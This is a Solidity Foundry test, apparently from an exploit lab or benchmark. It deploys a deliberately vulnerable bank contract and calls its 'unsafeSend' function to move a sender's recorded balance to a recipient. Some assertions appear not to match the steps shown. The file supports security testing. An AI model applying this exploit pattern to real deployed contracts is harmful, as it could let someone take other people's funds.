// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract RecipientContract is BaseTestWithBalanceLog {
    receive() external payable {}
}

contract ExploitTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    RecipientContract recipient;

    function setUp() public override {
        target = new VulnerableBank();
        recipient = new RecipientContract();

        vm.label(address(target), "VulnerableBank");
        vm.label(address(recipient), "RecipientContract");

        address owner = target.owner();
        fundAccount(owner, 1 ether); // Fund the owner to interact with the contract
    }

    function testExploit() public {
        address sender = getAddress(0);
        fundAccount(sender, 2 ether);

        target.deposit{value: 1 ether}();

        vm.startPrank(sender);
        uint256 amountToSend = 1 ether;
        target.unsafeSend(address(recipient), amountToSend);
        vm.stopPrank();

        // Check the balance of recipient
        assertEq(target.balances(address(recipient)), amountToSend);
        assertEq(target.balances(address(sender)), 1 ether);

        // Validate the exploit by checking the logs generated during the transaction
        balanceLog.requireBalanceChange(address(sender), -amountToSend, "Sender should have reduced balance");
        balanceLog.requireBalanceChange(address(recipient), amountToSend, "Recipient should have increased balance");
    }
}